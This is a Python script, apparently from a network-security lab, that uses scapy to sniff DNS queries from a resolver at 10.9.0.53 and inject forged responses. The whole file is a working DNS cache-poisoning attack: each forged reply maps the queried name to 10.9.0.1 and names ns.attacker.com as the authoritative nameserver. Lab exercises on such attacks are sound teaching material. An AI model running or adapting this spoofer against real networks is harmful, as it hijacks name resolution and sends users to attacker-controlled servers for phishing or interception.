#!/usr/bin/env python3
import sys
from typing import final

from scapy.all import PacketList, send, sniff
from scapy.layers.dns import DNS, DNSRR
from scapy.layers.inet import IP, UDP


@final
class Spoofer:
    def __init__(self, ns_name: str, if_name: str, filter: str) -> None:
        self.ns_name = ns_name
        self.if_name = if_name
        self.filter = filter

    def spoof_dns(self, pkt: PacketList) -> None:
        if (
            DNS in pkt
            and IP in pkt
            and pkt[IP].src == "10.9.0.53"
            and self.ns_name in pkt[DNS].qd.qname.decode("utf-8")
        ):
            print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
            # Creates an IP object, this is our spoofed answer.
            # In this case we could have set dst to 10.9.0.53
            # The attacker dns has this ip: 10.9.0.153
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            # Create a UDP object, spoofed answer UDP, since
            # DNS works over UDP (and TCP but we don't care about it now).
            udp = UDP(dport=pkt[UDP].sport, sport=53)
            # Create an answer record, DNS answer section.
            # rr = resource record
            # rdata: the ip that example.com will resolve to.
            Anssec = DNSRR(
                type="A", ttl=259200, rrname=pkt[DNS].qd.qname, rdata="10.9.0.1"
            )

            NSsec = DNSRR(
                rrname=pkt[DNS].qd.qname,
                type="NS",
                ttl=259200,
                rdata=b"ns.attacker.com.",  # We're telling that attacker.com dns is authoritative for example.com
            )

            # Create a DNS object
            dns = DNS(
                id=pkt[DNS].id,  # Same ID as the request
                qd=pkt[DNS].qd,  # Same request as the request
                aa=1,  # Difference with the local attack
                rd=0,
                qr=1,
                qdcount=1,
                ancount=1,
                nscount=1,  # Since we now have an Authoritative answer
                arcount=0,
                an=Anssec,
                ns=NSsec,
            )
            # Assemble the spoofed DNS packet
            spoofpkt = ip / udp / dns
            _ = send(spoofpkt)

    def spoof(self) -> None:
        sniff(iface=self.if_name, filter=self.filter, prn=self.spoof_dns)
